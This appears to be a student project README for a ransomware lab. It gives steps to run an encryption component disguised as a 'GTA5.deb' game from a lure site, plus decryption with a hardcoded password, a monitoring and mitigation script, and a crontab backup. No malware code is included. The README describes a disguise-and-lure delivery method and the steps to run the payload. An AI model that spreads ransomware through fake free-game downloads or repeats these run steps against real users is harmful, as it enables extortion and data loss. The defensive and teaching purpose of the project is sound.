# Ransomware

Before starting the test please install the dependencies by using the following command 

sudo apt-get install inotify-tools zenity python3 -y

Download the critical folder that consists of random text files into your ~/Download from the github repo provided 

Visit the website to automatically download the virus executable file from "https://free-steam-games.github.io/"

Start excuting the GTA5 executable as follow:
Running of attack/encryption component 
1. Download GTA5.deb
2. Open terminal from file downladed location 
3. type "chmod 777 GTA5.deb"
4. type "./GTA5.deb"

To run the decryption phase download decrypt.deb from github link provided adn run as follows:

Running of decrypt component 
1. Download decrypt.deb
2. open terminal from file download location
3. type "chmod 777 decrypt.deb"
4. type "./decrypt.deb"
5. when it asks for password its "group13"

To run the prevention phase download prevention.sh from github link provided adn run as follows:

Running montior, dectection and mitigation component 
1. Download prevention.sh
2. open terminal from file download location
3. type "chmod 777 prevention.sh"
4. type "./prevention.sh"
5. now try to perform encryption it will stop the malware and mitgate  

Crontab setup
For the backup component that we use we need to have a crontab setup for the mitigation component to work
1. create a "backup" folder in root
2. open terminal from that location as root user
3. Type "crontab -e" to create a cortab 
4. uncomment this line  # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ and change it to @daily tar -zcf /backup/home.tgz /home/"username"/Downloads/*
5. make sure it is active and has backed up once 
